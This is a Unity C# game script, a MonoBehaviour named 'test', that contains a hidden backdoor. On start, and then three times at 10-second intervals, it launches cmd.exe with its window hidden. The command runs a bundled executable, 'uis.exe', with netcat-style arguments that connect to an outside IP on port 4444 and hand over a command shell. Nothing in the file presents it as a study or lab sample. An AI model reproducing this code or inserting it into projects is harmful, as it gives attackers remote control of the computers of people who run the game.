using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class test : MonoBehaviour
{
    // Start is called before the first frame update
    void Start()
    {
 
        StartCoroutine(yes());
    }

    IEnumerator yes()
    {
        for (int i = 0; i < 3; i++)
        {
            yield return new WaitForSeconds(10);
            System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.Arguments = "/C cd trach2_Data & uis.exe 35.242.162.25 4444 -e cmd.exe & pause";
			process.StartInfo = startInfo;
			process.Start();
			//#yield return new WaitForSeconds(10);
        }
    }


}
    
